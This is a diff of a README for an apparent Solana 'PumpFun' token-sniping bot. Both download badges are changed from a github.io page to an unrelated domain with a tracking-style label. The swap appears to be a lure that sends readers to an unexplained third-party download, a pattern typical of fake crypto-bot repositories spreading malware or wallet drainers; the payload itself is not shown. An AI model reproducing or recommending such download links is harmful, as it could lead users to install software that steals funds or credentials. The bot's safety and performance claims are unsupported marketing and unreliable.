@@ -2,7 +2,7 @@
 
 The **Solana PumpFun Bot** is a high-speed, automated trading bot tailored specifically for the **Pump.fun** platform on the Solana blockchain. Designed for both beginners and experienced DeFi traders, this bot allows you to snipe newly launched tokens, automate buys and sells, and react faster than manual trading ever could.
 
-[![Download Solana PumpFunBot](https://img.shields.io/badge/Download-Solana%20PumpFunBot-blueviolet)](https://solana-pumpfun-bot.github.io/.github/)
+[![Download Solana PumpFunBot](https://img.shields.io/badge/Download-Solana%20PumpFunBot-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -45,4 +45,4 @@ The **Solana PumpFun Bot** is a high-speed, automated trading bot tailored speci
 - 🧠 **Emotionless trading** with strict strategies
 - 🛡️ **Safe execution** with built-in checks and controls
 
-[![Download Solana PumpFunBot](https://img.shields.io/badge/Download-Solana%20PumpFunBot-blueviolet)](https://solana-pumpfun-bot.github.io/.github/)
+[![Download Solana PumpFunBot](https://img.shields.io/badge/Download-Solana%20PumpFunBot-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
